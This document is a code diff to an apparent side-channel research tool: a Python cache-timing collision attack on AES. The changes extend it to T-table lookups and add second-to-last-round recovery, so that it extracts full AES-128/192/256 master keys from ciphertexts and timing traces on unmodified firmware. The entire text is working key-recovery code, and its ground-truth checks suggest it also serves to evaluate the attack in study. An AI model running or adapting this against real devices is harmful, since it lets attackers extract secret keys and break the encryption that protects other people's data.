@@ -31,16 +31,18 @@ SINV = aesref.SINV.astype(np.int64)
 _BASE = np.arange(256)
 _NIB_CACHE = {}
 
-def _nib(tbl):
-    """NB[g, x] = high nibble of tbl[x ^ g]; cached per table."""
-    key = tbl.ctypes.data
+def _nib(tbl, shift=4):
+    """NB[g, x] = tbl[x ^ g] >> shift, i.e. the cache-line tag of the lookup.
+    shift=4 (S-box: 1-byte entries, 16/line -> top nibble); shift=2 (T-table:
+    4-byte entries, 4/line -> top 6 bits). Cached per (table, shift)."""
+    key = (tbl.ctypes.data, shift)
     NB = _NIB_CACHE.get(key)
     if NB is None:
-        NB = (tbl[_BASE[None, :] ^ _BASE[:, None]] >> 4).astype(np.intp)  # (256 g, 256 x)
+        NB = (tbl[_BASE[None, :] ^ _BASE[:, None]] >> shift).astype(np.intp)  # (256 g, 256 x)
         _NIB_CACHE[key] = NB
     return NB
 
-def col_attack_scored(ba, bb, y, tbl):
+def col_attack_scored(ba, bb, y, tbl, line_shift=4):
     """Best (ga,gb) minimising mean time on the predicted top-nibble-collision
     set, and a margin (how far below the mean score the winner sits, in std
     units). `tbl` = SINV (enc direction) or SBOX (dec direction). Vectorised over
@@ -48,12 +50,13 @@ def col_attack_scored(ba, bb, y, tbl):
     ba = np.asarray(ba, np.int64); bb = np.asarray(bb, np.int64)
     Ssum = np.zeros((256, 256)); Scnt = np.zeros((256, 256))
     np.add.at(Ssum, (ba, bb), y); np.add.at(Scnt, (ba, bb), 1.0)
-    NB = _nib(tbl)                                   # (256, 256)
+    NB = _nib(tbl, line_shift)                       # (256, 256)
+    nbins = 1 << (8 - line_shift)                    # 16 for S-box, 64 for T-table
     scores = np.full((256, 256), np.nan)
     for ga in range(256):
-        na = NB[ga]                                  # (256,) nibble per x_a
-        Rs = np.zeros((16, 256)); Rc = np.zeros((16, 256))
-        np.add.at(Rs, na, Ssum)                      # sum rows into nibble bins -> Rs[nib, x_b]
+        na = NB[ga]                                  # (256,) line-tag per x_a
+        Rs = np.zeros((nbins, 256)); Rc = np.zeros((nbins, 256))
+        np.add.at(Rs, na, Ssum)                      # sum rows into line bins -> Rs[tag, x_b]
         np.add.at(Rc, na, Scnt)
         num = Rs[NB, _BASE[None, :]].sum(axis=1)     # for every gb at once -> (256,)
         den = Rc[NB, _BASE[None, :]].sum(axis=1)
@@ -113,7 +116,7 @@ def _roundkey_to_master(rkbytes, direction, keysize):
     return None                                      # 192/256: single round key insufficient
 
 
-def recover(known_blocks, timing, *, direction="enc", keysize=128,
+def recover(known_blocks, timing, *, direction="enc", keysize=128, line_shift=4,
             verify=None, cand_per_pos=4, max_bruteforce=6, truth=None, log=None):
     """Recover the key from (known block-cipher output blocks, timing).
 
@@ -130,7 +133,7 @@ def recover(known_blocks, timing, *, direction="enc", keysize=128,
     votes = np.zeros((16, 256))
     for a in range(16):
         for b in range(a + 1, 16):
-            ga, gb, mg = col_attack_scored(known[:, a], known[:, b], y, tbl)
+            ga, gb, mg = col_attack_scored(known[:, a], known[:, b], y, tbl, line_shift)
             if mg > 0:
                 votes[a, ga] += mg
                 votes[b, gb] += mg
@@ -198,3 +201,70 @@ def recover(known_blocks, timing, *, direction="enc", keysize=128,
 
 def _rk_last_from_master(master):
     return bytes(aesref.key_expansion(master)[-1])
+
+
+# --------------------------------------------------------------------------
+# Second-to-last round recovery -> full AES-192/256 master, on FULL (unmodified,
+# no round-reduction) firmware, from the SAME traces. MixColumns is linear, so we
+# push it onto the known peeled state and the round Nr-1 S-box/T-table lookups
+# become byte-wise in a transformed key K' -- an ordinary last-round-style scan.
+# --------------------------------------------------------------------------
+
+def peel_last_round(ct, rk_last):
+    """State entering the last round (= output of round Nr-1), per trace:
+    a = SB^{-1}(SR^{-1}(ct ^ rk_last))."""
+    ct = np.asarray(ct, np.uint8)
+    v = (ct ^ np.frombuffer(bytes(rk_last), np.uint8))[:, aesref._ISR]
+    return aesref.SINV[v]
+
+def _second_round_known(a):
+    """X' = SR^{-1}(MC^{-1}(a)) -- the known input for the round Nr-1 scan."""
+    X = aesref._mix(a.astype(np.uint8), inv=True)          # InvMixColumns
+    return X[:, aesref._ISR].astype(int)
+
+def _roundkey_from_Kprime(Kp):
+    """rk[Nr-1] = MC(SR(K'))."""
+    srk = np.frombuffer(bytes(Kp), np.uint8)[aesref._SHIFT_ROWS]
+    return bytes(aesref._mix(srk[None, :].copy(), inv=False)[0])
+
+def recover_second_round(ct, timing, rk_last, *, keysize, line_shift=4, truth=None, log=None):
+    """Recover rk[Nr-1] on full firmware, given ct, timing and the recovered
+    last round key. `line_shift` matches round Nr-1's table (4 = S-box, 2 = 4-byte
+    T-table)."""
+    a = peel_last_round(ct, rk_last)
+    Xp = _second_round_known(a)
+    res = recover(Xp, timing, direction="enc", keysize=keysize, line_shift=line_shift, log=log)
+    res.roundkey = _roundkey_from_Kprime(res.roundkey)
+    res.roundkey_index = {128: 10, 192: 12, 256: 14}[keysize] - 1
+    res.which = "second-to-last"
+    if truth is not None:
+        res.truth_correct = sum(res.roundkey[i] == truth[i] for i in range(16))
+    return res
+
+
+def recover_full(ct, timing, *, keysize, line_shift_last=4, line_shift_prev=4,
+                 verify=None, key_for_truth=None, log=None):
+    """Full AES-128/192/256 master from ct + timing on unmodified firmware.
+    For 128 the last round key suffices; for 192/256 also recovers rk[Nr-1] via
+    the MixColumns-linearity reduction and inverts the schedule. `verify=(pt,ct)`
+    enables master verification + brute-force of low-confidence bytes."""
+    Nr = {128: 10, 192: 12, 256: 14}[keysize]
+    tl = bytes(aesref.key_expansion(key_for_truth)[Nr]) if key_for_truth else None
+    last = recover(ct, timing, direction="enc", keysize=keysize, line_shift=line_shift_last,
+                   truth=tl, log=log)
+    results = [last]
+    if keysize != 128:
+        tp = bytes(aesref.key_expansion(key_for_truth)[Nr - 1]) if key_for_truth else None
+        prev = recover_second_round(ct, timing, last.roundkey, keysize=keysize,
+                                    line_shift=line_shift_prev, truth=tp, log=log)
+        results.append(prev)
+    try:
+        master = master_from_results(results, keysize)
+    except ValueError:
+        master = None
+    verified = None
+    if verify is not None and master is not None:
+        pt = np.frombuffer(verify[0], np.uint8)[None, :]
+        verified = aesref.encrypt_blocks(master, pt)[0].tobytes() == bytes(verify[1])
+    return {"master": master, "verified": verified, "round_keys": results,
+            "correct": [r.truth_correct for r in results]}
